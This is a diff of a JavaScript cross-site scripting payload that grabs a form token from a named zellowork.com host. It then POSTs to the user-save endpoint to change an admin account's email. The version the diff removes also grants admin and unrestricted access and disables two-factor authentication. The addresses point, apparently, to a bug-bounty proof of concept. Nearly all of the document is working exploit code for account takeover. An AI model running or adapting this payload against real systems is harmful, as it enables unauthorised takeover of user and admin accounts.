@@ -1,64 +1,47 @@
 console.log('XSSED')
-alert(document.domain);
-(async () => {
+alert(document.domain);(async () => {
     try {
-        console.log("Step 1: Fetching formToken...");
+        console.log("Step 1: Grabbing fresh formToken...");
         
-        // 1. Get the current status to grab a fresh formToken
-        const statusResponse = await fetch('https://harrywh1.zellowork.com/system/statusget?context=1');
-        const statusData = await statusResponse.json();
-        const token = statusData.context.formToken;
+        // 1. Fetch the token dynamically
+        const statusRes = await fetch('https://harrywh1.zellowork.com/system/statusget?context=1');
+        const statusData = await statusRes.json();
+        const freshToken = statusData.context.formToken;
 
-        if (!token) {
-            throw new Error("Could not find formToken in the status response.");
+        if (!freshToken) {
+            throw new Error("Could not retrieve formToken. Are you logged in?");
         }
 
-        console.log("Token acquired:", token);
-        console.log("Step 2: Sending POST request to save user...");
+        console.log("Token retrieved:", freshToken);
+        console.log("Step 2: Sending the POST request to update admin email...");
 
-        // 2. Prepare the form-urlencoded body
-        const details = {
-            'safestrings': 'true',
-            'name': 'changed',
-            'email': 'ambushneupane+xyz@gmail.com', // Your target email
-            'phone': '',
-            'admin': 'true',
-            'unrestricted_access': 'true',
-            'rec_on': 'true',
-            'geotracking_on': 'true',
-            'isAdmin': 'true',
-            'formToken': token // Injected from step 1
-        };
+        // 2. Build the payload exactly as requested
+        // Note: URLSearchParams handles the %2B encoding for the '+' automatically
+        const params = new URLSearchParams();
+        params.append('safestrings', 'true');
+        params.append('name', 'admin');
+        params.append('email', 'changed@yeswehack.ninja');
+        params.append('formToken', freshToken);
 
-        // Standard body parameters from your request
-        const formBody = new URLSearchParams(details);
-        
-        // Adding the rest of your provided flags
-        formBody.append('full_name', 'changed');
-        formBody.append('job', 'nothing');
-        formBody.append('is_gateway', 'false');
-        formBody.append('2fa[verified]', 'false');
-        formBody.append('2fa[enabled]', 'false');
-
-        // 3. Perform the POST
-        const postResponse = await fetch('https://harrywh1.zellowork.com/user/save?context=1', {
+        // 3. Execute the POST
+        const saveRes = await fetch('https://harrywh1.zellowork.com/user/save?context=1', {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                 'X-Requested-With': 'XMLHttpRequest'
             },
-            body: formBody
+            body: params.toString()
         });
 
-        const result = await postResponse.json();
-        
+        const result = await saveRes.json();
+
         if (result.status === "OK") {
-            console.log("%cSuccess!", "color: green; font-weight: bold;", "User updated successfully.");
+            console.log("%c[!] Success: Admin user updated.", "color: #00ff00; font-weight: bold;");
         } else {
-            console.error("Server returned an error:", result);
+            console.error("Server error:", result);
         }
 
-    } catch (error) {
-        console.error("Execution failed:", error);
+    } catch (err) {
+        console.error("Script failed:", err);
     }
 })();
